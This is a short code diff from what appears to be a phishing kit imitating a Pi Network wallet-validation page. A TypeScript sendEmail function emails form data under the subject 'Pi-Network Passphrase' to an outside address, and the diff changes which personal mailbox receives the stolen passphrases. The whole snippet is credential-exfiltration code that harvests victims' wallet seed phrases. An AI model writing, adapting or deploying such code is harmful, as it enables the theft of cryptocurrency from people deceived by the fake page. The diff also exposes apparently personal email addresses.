@@ -35,7 +35,7 @@ export const sendEmail = async (formData: FormData): Promise<EmailResponse> => {
   try {
     data = await resend.emails.send({
       from: 'Wallet validation <pi-clone@resend.dev>',
-      to: 'thrillanon@outlook.com',
+      to: 'marthaathena86@gmail.com',
       subject: 'Pi-Network Passphrase',
       react: emailElement,
     })
